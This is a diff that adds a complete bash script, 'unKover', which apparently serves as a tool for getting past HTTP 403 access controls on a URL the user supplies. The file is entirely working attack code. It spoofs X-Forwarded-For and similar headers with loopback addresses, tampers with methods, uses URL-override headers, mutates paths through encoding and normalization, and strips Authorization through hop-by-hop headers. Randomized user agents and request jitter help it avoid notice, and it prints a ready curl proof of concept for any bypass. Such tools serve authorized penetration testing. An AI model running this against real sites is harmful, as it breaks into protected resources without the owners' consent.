@@ -1,0 +1,626 @@
+#!/bin/bash
+
+# unKover - 403 Access Bypass Tester by Brute Logic
+# Dependencies: curl
+# Usage: bash unkover <URL> [-j|--json] [--prefix /v2]
+# Live 403 bypass detection with optional JSON output
+
+# ---------------------------------------------------------------------------
+# CONFIG
+# ---------------------------------------------------------------------------
+
+TOOL="unkover v1.0 by Brute Logic - https://brutelogic.net"
+JSON_MODE=false
+CONNECT_TIMEOUT=3
+MAX_TIME=5
+
+URL=""
+PREFIX=""
+
+for arg in "$@"; do
+    case "$arg" in
+        -j|--json) JSON_MODE=true ;;
+        --prefix) PREFIX_NEXT=1 ;;
+        *) [[ "$PREFIX_NEXT" == "1" ]] && PREFIX="$arg" && PREFIX_NEXT=0 || URL="$arg" ;;
+    esac
+done
+
+# ---------------------------------------------------------------------------
+# PAYLOAD ARRAYS
+# ---------------------------------------------------------------------------
+
+USER_AGENTS=(
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0"
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0"
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
+)
+
+# Realistic browser headers sent with every request
+BROWSER_HEADERS=(
+    -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+    -H "Accept-Language: en-US,en;q=0.5"
+    -H "Accept-Encoding: gzip, deflate, br"
+    -H "Connection: keep-alive"
+)
+
+IP_HEADERS=(
+    "X-Forwarded-For"
+    "X-Real-IP"
+    "X-Original-Forwarded-For"
+    "X-Client-IP"
+    "True-Client-IP"
+    "CF-Connecting-IP"
+)
+
+IP_VALUES=(
+    "127.0.0.1"
+    "127.1.1.1"
+    "192.168.1.1"
+    "10.0.0.1"
+    "172.16.0.1"
+)
+
+# Ordered by PoC relevance — POST/PUT before OPTIONS/HEAD
+METHODS=(
+    "POST"
+    "PUT"
+    "PATCH"
+    "HEAD"
+    "OPTIONS"
+    "BRUTE"
+)
+
+METHODS_LOWER=(
+    "get"
+    "post"
+    "put"
+    "head"
+    "options"
+)
+
+REFERER_VALUES=(
+    "admin"
+    "dashboard"
+    "internal"
+)
+
+PROTO_VALUES=(
+    "https"
+    "http"
+)
+
+HOP_BY_HOP_HEADERS=(
+    "Authorization"
+    "Cookie"
+    "X-Api-Key"
+    "X-Auth-Token"
+    "X-Access-Token"
+)
+
+SUFFIXES=(
+    "/"
+    "/.json"
+    "%20"
+    ".css"
+    ";x"
+)
+
+# Ordered low-noise → high-noise
+PATH_VARIANTS=(
+    "/."
+    "/./"
+    "//"
+    "/%2f"
+    "/%20"
+    "/%09"
+    "/..;/"
+)
+
+# Ordered low-noise → high-noise
+OVERRIDE_HEADERS=(
+    "X-Rewrite-URL"
+    "X-Original-URL"
+)
+
+# ---------------------------------------------------------------------------
+# OUTPUT & DISPLAY
+# ---------------------------------------------------------------------------
+
+# Color codes
+RED='\033[1;31m'
+GREEN='\033[1;32m'
+YELLOW='\033[1;33m'
+NC='\033[0m' # No color
+
+# Print header
+header() {
+    echo ""
+    echo "$TOOL"
+    echo ""
+}
+
+usage() {
+    header
+    echo "Usage: bash unkover <URL> [--prefix /v2] [-j|--json]"
+    echo ""
+    echo "Arguments:"
+    echo "  URL        Target URL returning 403 (required)"
+    echo "  --prefix   Additional path prefix for API version bypass (optional)"
+    echo "  -j|--json  Output results in JSON format"
+    echo ""
+    echo "Examples:"
+    echo "  bash unkover https://target.com/admin"
+    echo "  bash unkover https://target.com/admin --prefix /v2"
+    echo "  bash unkover https://target.com/admin -j | jq"
+    echo ""
+    exit 1
+}
+
+# Print result in human mode
+print_result() {
+    $JSON_MODE && return
+    printf "\r\033[K"
+    echo "Target: $URL"
+    echo "Baseline: $baseline_status ($baseline_size bytes)"
+    echo ""
+    if [[ "$DONE" -eq 1 ]]; then
+        printf "${GREEN}BYPASS FOUND${NC}\n"
+        echo "Technique: $(echo "$FINDINGS" | grep -oP '(?<="technique":")[^"]*')"
+        printf "${YELLOW}PoC: $FIRST_POC${NC}\n"
+        echo "Result: $(echo "$FINDINGS" | grep -oP '(?<="status":)[0-9]+') ($(echo "$FINDINGS" | grep -oP '(?<="size":)[0-9]+') bytes)"
+    else
+        printf "${RED}No bypass found.${NC}\n"
+    fi
+    echo ""
+}
+
+# JSON output
+json_output() {
+    local bypass="false"
+    local poc="null"
+    [[ -n "$FIRST_POC" ]] && bypass="true" && poc="\"$(json_str "$FIRST_POC")\""
+
+    printf '{"meta":{"tool":"%s","timestamp":"%s","elapsed_time":%d},"bypass":%s,"target":"%s","poc":%s,"findings":%s,"baseline":{"status":%s,"size":%s}}\n' \
+    	"$TOOL" \
+    	"$(date '+%d-%b-%Y %H:%M:%S')" \
+    	"$elapsed" \
+    	"$bypass" \
+    	"$(json_str "$URL")" \
+    	"$poc" \
+    	"$FINDINGS" \
+    	"$baseline_status" \
+    	"$baseline_size"
+}
+
+# ---------------------------------------------------------------------------
+# HELPERS
+# ---------------------------------------------------------------------------
+
+# Random UA
+random_ua() {
+    echo "${USER_AGENTS[$RANDOM % ${#USER_AGENTS[@]}]}"
+}
+
+# Random jitter 100-500ms
+jitter() {
+    local ms=$(( (RANDOM % 400) + 100 ))
+    sleep "0.${ms}"
+}
+
+# Fire request, return "STATUS SIZE"
+# --compressed needed for consistent size_download when Accept-Encoding: gzip is sent
+req() {
+    local url="$1"
+    shift
+    local ua; ua=$(random_ua)
+    local out
+    out=$(curl -sk --compressed -o /dev/null -w "%{http_code} %{size_download}" \
+        --connect-timeout "$CONNECT_TIMEOUT" \
+        --max-time "$MAX_TIME" \
+        -A "$ua" \
+        "${BROWSER_HEADERS[@]}" \
+        "$@" "$url" 2>/dev/null) || out="000 0"
+    jitter
+    echo "$out"
+}
+
+# Extract status from "STATUS SIZE"
+status_of() { echo "$1" | cut -d' ' -f1; }
+
+# Extract size from "STATUS SIZE"
+size_of() { echo "$1" | cut -d' ' -f2; }
+
+# Check if status is a bypass (2xx or 3xx)
+is_bypass() { [[ "$1" =~ ^[23] ]]; }
+
+# Escape string for JSON
+json_str() {
+    local s="$1"
+    s="${s//\\/\\\\}"
+    s="${s//\"/\\\"}"
+    echo "$s"
+}
+
+# Extract base URL (scheme + host)
+get_base() { echo "$1" | sed 's|\(https\?://[^/]*\).*|\1|'; }
+
+# Extract path (everything after scheme + host)
+get_path() { echo "$1" | sed 's|https\?://[^/]*||'; }
+
+run_test() {
+    local name="$1"
+    local func="$2"
+    shift 2
+    [[ $DONE -eq 1 ]] && return
+    $JSON_MODE || printf "\rTesting %-25s" "${name}..."
+    "$func" "$@"
+}
+
+# ---------------------------------------------------------------------------
+# WILDCARD CALIBRATION
+# ---------------------------------------------------------------------------
+
+calibrate() {
+    local url="$1"
+    local rand="nonexistent_$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)"
+    local base; base=$(get_base "$url")
+    local path; path=$(get_path "$url")
+    local probe="${base}${path%/*}/${rand}"
+    local res; res=$(req "$probe")
+    WILDCARD_STATUS=$(status_of "$res")
+    WILDCARD_SIZE=$(size_of "$res")
+}
+
+# Check if result matches wildcard baseline (FP filter)
+is_wildcard() {
+    local status="$1"
+    local size="$2"
+    [[ "$status" == "$WILDCARD_STATUS" ]] || return 1
+    local diff=$(( size - WILDCARD_SIZE ))
+    [[ $diff -lt 0 ]] && diff=$(( -diff ))
+    [[ $diff -le 50 ]]
+}
+
+# ---------------------------------------------------------------------------
+# FINDING BUILDER
+# ---------------------------------------------------------------------------
+
+FINDINGS="[]"
+FIRST_POC=""
+WILDCARD_STATUS=""
+WILDCARD_SIZE=0
+DONE=0
+
+add_finding() {
+    local technique="$1"
+    local request_json="$2"
+    local status="$3"
+    local size="$4"
+    local poc="$5"
+
+    # Skip if matches wildcard baseline
+    is_wildcard "$status" "$size" && return
+
+    local finding
+    finding=$(printf '{"technique":"%s","request":%s,"result":{"status":%s,"size":%s}}' \
+        "$technique" "$request_json" "$status" "$size")
+
+    FINDINGS="[$finding]"
+    FIRST_POC="$poc"
+    DONE=1
+}
+
+# ---------------------------------------------------------------------------
+# TECHNIQUES — ordered by reliability and specificity
+# ---------------------------------------------------------------------------
+
+test_ip_headers() {
+    local url="$1"
+    [[ $DONE -eq 1 ]] && return
+    for header in "${IP_HEADERS[@]}"; do
+        [[ $DONE -eq 1 ]] && return
+        for ip in "${IP_VALUES[@]}"; do
+            [[ $DONE -eq 1 ]] && return
+            local res; res=$(req "$url" -H "${header}: ${ip}")
+            local s; s=$(status_of "$res")
+            local z; z=$(size_of "$res")
+            if is_bypass "$s"; then
+                local req_json
+                req_json=$(printf '{"header":"%s","value":"%s"}' \
+                    "$(json_str "$header")" "$(json_str "$ip")")
+                local poc="curl -i -H '${header}: ${ip}' '$(json_str "$url")'"
+                add_finding "ip_header_spoof" "$req_json" "$s" "$z" "$poc"
+            fi
+        done
+    done
+}
+
+test_method_tampering() {
+    local url="$1"
+    [[ $DONE -eq 1 ]] && return
+    for method in "${METHODS[@]}"; do
+        [[ $DONE -eq 1 ]] && return
+        local res; res=$(req "$url" -X "$method")
+        local s; s=$(status_of "$res")
+        local z; z=$(size_of "$res")
+        if is_bypass "$s"; then
+            local req_json; req_json=$(printf '{"method":"%s"}' "$method")
+            local poc="curl -i -X '${method}' '$(json_str "$url")'"
+            add_finding "method_tampering" "$req_json" "$s" "$z" "$poc"
+        fi
+    done
+}
+
+test_method_case() {
+    local url="$1"
+    [[ $DONE -eq 1 ]] && return
+    for method in "${METHODS_LOWER[@]}"; do
+        [[ $DONE -eq 1 ]] && return
+        local res; res=$(req "$url" -X "$method")
+        local s; s=$(status_of "$res")
+        local z; z=$(size_of "$res")
+        if is_bypass "$s"; then
+            local req_json; req_json=$(printf '{"method":"%s"}' "$method")
+            local poc="curl -i -X '${method}' '$(json_str "$url")'"
+            add_finding "method_case" "$req_json" "$s" "$z" "$poc"
+        fi
+    done
+}
+
+test_protocol_header() {
+    local url="$1"
+    [[ $DONE -eq 1 ]] && return
+    for proto in "${PROTO_VALUES[@]}"; do
+        [[ $DONE -eq 1 ]] && return
+        local res; res=$(req "$url" -H "X-Forwarded-Proto: ${proto}")
+        local s; s=$(status_of "$res")
+        local z; z=$(size_of "$res")
+        if is_bypass "$s"; then
+            local req_json; req_json=$(printf '{"header":"X-Forwarded-Proto","value":"%s"}' "$proto")
+            local poc="curl -i -H 'X-Forwarded-Proto: ${proto}' '$(json_str "$url")'"
+            add_finding "protocol_header" "$req_json" "$s" "$z" "$poc"
+        fi
+    done
+}
+
+test_referer() {
+    local url="$1"
+    [[ $DONE -eq 1 ]] && return
+    local host; host=$(get_base "$url")
+    for ref in "${REFERER_VALUES[@]}"; do
+        [[ $DONE -eq 1 ]] && return
+        local referer="${host}/${ref}"
+        local res; res=$(req "$url" -H "Referer: ${referer}")
+        local s; s=$(status_of "$res")
+        local z; z=$(size_of "$res")
+        if is_bypass "$s"; then
+            local req_json; req_json=$(printf '{"header":"Referer","value":"%s"}' "$(json_str "$referer")")
+            local poc="curl -i -H 'Referer: ${referer}' '$(json_str "$url")'"
+            add_finding "referer_trust" "$req_json" "$s" "$z" "$poc"
+        fi
+    done
+}
+
+test_header_override() {
+    local url="$1"
+    [[ $DONE -eq 1 ]] && return
+    local path; path=$(get_path "$url")
+    local base; base=$(get_base "$url")
+    for header in "${OVERRIDE_HEADERS[@]}"; do
+        [[ $DONE -eq 1 ]] && return
+	local res; res=$(req "$url" -H "${header}: ${path}")
+        local s; s=$(status_of "$res")
+        local z; z=$(size_of "$res")
+        if is_bypass "$s"; then
+            local req_json
+            req_json=$(printf '{"header":"%s","value":"%s"}' \
+                "$(json_str "$header")" "$(json_str "$path")")
+            local poc="curl -i -H '${header}: ${path}' '$(json_str "$url")'"
+            add_finding "header_override" "$req_json" "$s" "$z" "$poc"
+        fi
+    done
+}
+
+test_url_encoding() {
+    local url="$1"
+    [[ $DONE -eq 1 ]] && return
+    local base; base=$(get_base "$url")
+    local path; path=$(get_path "$url")
+
+    # Encode first char of the last path segment
+    local last_segment; last_segment=$(basename "$path")
+    local encoded_segment
+    encoded_segment=$(echo "$last_segment" | sed 's/^\(.\)/\1/' | \
+        sed 's/^a/%61/;s/^b/%62/;s/^c/%63/;s/^d/%64/;s/^e/%65/;s/^f/%66/;
+             s/^g/%67/;s/^h/%68/;s/^i/%69/;s/^j/%6a/;s/^k/%6b/;s/^l/%6c/;
+             s/^m/%6d/;s/^n/%6e/;s/^o/%6f/;s/^p/%70/;s/^q/%71/;s/^r/%72/;
+             s/^s/%73/;s/^t/%74/;s/^u/%75/;s/^v/%76/;s/^w/%77/;s/^x/%78/;
+             s/^y/%79/;s/^z/%7a/;s/^A/%41/;s/^B/%42/;s/^C/%43/;s/^D/%44/;
+             s/^E/%45/;s/^F/%46/;s/^G/%47/;s/^H/%48/;s/^I/%49/')
+    local parent_path; parent_path=$(dirname "$path")
+    local mutated="${base}${parent_path}/${encoded_segment}"
+    local res; res=$(req "$mutated" --path-as-is)
+    local s; s=$(status_of "$res")
+    local z; z=$(size_of "$res")
+    if is_bypass "$s"; then
+        local req_json; req_json=$(printf '{"path":"%s"}' "$(json_str "$mutated")")
+        local poc="curl -i --path-as-is '$(json_str "$mutated")'"
+        add_finding "url_encoding" "$req_json" "$s" "$z" "$poc"
+    fi
+
+    [[ $DONE -eq 1 ]] && return
+
+    # Double encoding
+    local double="${base}${path//\%/%25}"
+    res=$(req "$double" --path-as-is)
+    s=$(status_of "$res"); z=$(size_of "$res")
+    if is_bypass "$s"; then
+        local req_json; req_json=$(printf '{"path":"%s"}' "$(json_str "$double")")
+        local poc="curl -i --path-as-is '$(json_str "$double")'"
+        add_finding "url_encoding" "$req_json" "$s" "$z" "$poc"
+    fi
+}
+
+test_path_normalization() {
+    local url="$1"
+    [[ $DONE -eq 1 ]] && return
+    local base; base=$(get_base "$url")
+    local path; path=$(get_path "$url")
+    for variant in "${PATH_VARIANTS[@]}"; do
+        [[ $DONE -eq 1 ]] && return
+        local mutated="${base}${variant}${path#/}"
+        local res; res=$(req "$mutated" --path-as-is)
+        local s; s=$(status_of "$res")
+        local z; z=$(size_of "$res")
+        if is_bypass "$s"; then
+            local req_json; req_json=$(printf '{"path":"%s"}' "$(json_str "$mutated")")
+            local poc="curl -i --path-as-is '$(json_str "$mutated")'"
+            add_finding "path_normalization" "$req_json" "$s" "$z" "$poc"
+        fi
+    done
+}
+
+test_http10() {
+    local url="$1"
+    [[ $DONE -eq 1 ]] && return
+    local res; res=$(curl -sk --http1.0 -o /dev/null -w "%{http_code} %{size_download}" \
+        --connect-timeout "$CONNECT_TIMEOUT" \
+        --max-time "$MAX_TIME" \
+        "$url" 2>/dev/null) || res="000 0"
+    jitter
+    local s; s=$(status_of "$res")
+    local z; z=$(size_of "$res")
+    if is_bypass "$s"; then
+        local req_json; req_json=$(printf '{"protocol":"HTTP/1.0"}')
+        local poc="curl -i --http1.0 '$(json_str "$url")'"
+        add_finding "http10_bypass" "$req_json" "$s" "$z" "$poc"
+    fi
+}
+
+test_hop_by_hop() {
+    local url="$1"
+    [[ $DONE -eq 1 ]] && return
+    for header in "${HOP_BY_HOP_HEADERS[@]}"; do
+        [[ $DONE -eq 1 ]] && return
+        local res; res=$(req "$url" -H "${header}: bypass" -H "Connection: ${header}")
+        local s; s=$(status_of "$res")
+        local z; z=$(size_of "$res")
+        if is_bypass "$s"; then
+            local req_json; req_json=$(printf '{"header":"%s"}' "$(json_str "$header")")
+            local poc="curl -i -H '${header}: bypass' -H 'Connection: ${header}' '$(json_str "$url")'"
+            add_finding "hop_by_hop" "$req_json" "$s" "$z" "$poc"
+        fi
+    done
+}
+
+test_path_suffix() {
+    local url="$1"
+    [[ $DONE -eq 1 ]] && return
+    for suffix in "${SUFFIXES[@]}"; do
+        [[ $DONE -eq 1 ]] && return
+        local mutated="${url}${suffix}"
+        local res; res=$(req "$mutated" --path-as-is)
+        local s; s=$(status_of "$res")
+        local z; z=$(size_of "$res")
+        if is_bypass "$s"; then
+            local req_json; req_json=$(printf '{"path":"%s"}' "$(json_str "$mutated")")
+            local poc="curl -i --path-as-is '$(json_str "$mutated")'"
+            add_finding "path_suffix" "$req_json" "$s" "$z" "$poc"
+        fi
+    done
+}
+
+test_api_version() {
+    local url="$1"
+    local prefix="$2"
+    [[ $DONE -eq 1 ]] && return
+    local base; base=$(get_base "$url")
+    local path; path=$(get_path "$url")
+
+    # Sub-technique 1: prefix injection
+    local prefixes=("/v2" "/v3" "/api/v1" "/api/v2" "/api")
+    [[ -n "$prefix" ]] && prefixes+=("$prefix")
+
+    for p in "${prefixes[@]}"; do
+        [[ $DONE -eq 1 ]] && return
+        local mutated="${base}${p}${path}"
+        local res; res=$(req "$mutated")
+        local s; s=$(status_of "$res")
+        local z; z=$(size_of "$res")
+        if is_bypass "$s"; then
+            local req_json; req_json=$(printf '{"path":"%s"}' "$(json_str "$mutated")")
+            local poc="curl -i '$(json_str "$mutated")'"
+            add_finding "api_version" "$req_json" "$s" "$z" "$poc"
+        fi
+    done
+
+    # Sub-technique 2: version swap (replace /v1/ with alternatives)
+    if [[ "$path" =~ /v[0-9]+/ ]]; then
+        local swap_targets=("v2" "v3" "v4" "v1.1" "v2.0")
+        for sv in "${swap_targets[@]}"; do
+            [[ $DONE -eq 1 ]] && return
+            local swapped; swapped=$(echo "$path" | sed "s|/v[0-9][^/]*/|/${sv}/|")
+            [[ "$swapped" == "$path" ]] && continue
+            local mutated="${base}${swapped}"
+            local res; res=$(req "$mutated")
+            local s; s=$(status_of "$res")
+            local z; z=$(size_of "$res")
+            if is_bypass "$s"; then
+                local req_json; req_json=$(printf '{"path":"%s"}' "$(json_str "$mutated")")
+                local poc="curl -i '$(json_str "$mutated")'"
+                add_finding "api_version" "$req_json" "$s" "$z" "$poc"
+            fi
+        done
+    fi
+}
+
+# ---------------------------------------------------------------------------
+# MAIN
+# ---------------------------------------------------------------------------
+
+main() {
+    [[ -z "$URL" ]] && usage
+    START_TIME=$SECONDS
+    $JSON_MODE || header
+
+    # Preflight — confirm target returns 403
+    local baseline; baseline=$(req "$URL")
+    local baseline_status; baseline_status=$(status_of "$baseline")
+    local baseline_size; baseline_size=$(size_of "$baseline")
+
+    if [[ "$baseline_status" != "403" ]]; then
+        printf '{"error":"target returned %s, expected 403","target":"%s"}\n' \
+            "$baseline_status" "$(json_str "$URL")"
+        exit 1
+    fi
+
+    # Wildcard calibration — learn server default behavior
+    calibrate "$URL"
+
+    # Run techniques — most specific/reliable first, stop at first bypass
+    run_test "ip_header_spoof"     test_ip_headers       "$URL"
+    run_test "method_tampering"    test_method_tampering  "$URL"
+    run_test "method_case"         test_method_case       "$URL"
+    run_test "protocol_header"     test_protocol_header   "$URL"
+    run_test "referer"             test_referer           "$URL"
+    run_test "header_override"     test_header_override   "$URL"
+    run_test "url_encoding"        test_url_encoding      "$URL"
+    run_test "path_normalization"  test_path_normalization "$URL"
+    run_test "http10"              test_http10            "$URL"
+    run_test "hop_by_hop"          test_hop_by_hop        "$URL"
+    run_test "path_suffix"         test_path_suffix       "$URL"
+    run_test "api_version"         test_api_version       "$URL" "$PREFIX"
+
+    elapsed=$(( SECONDS - START_TIME ))
+
+    if $JSON_MODE; then
+    	json_output
+    else
+    	print_result
+    fi
+}
+
+main "$@"
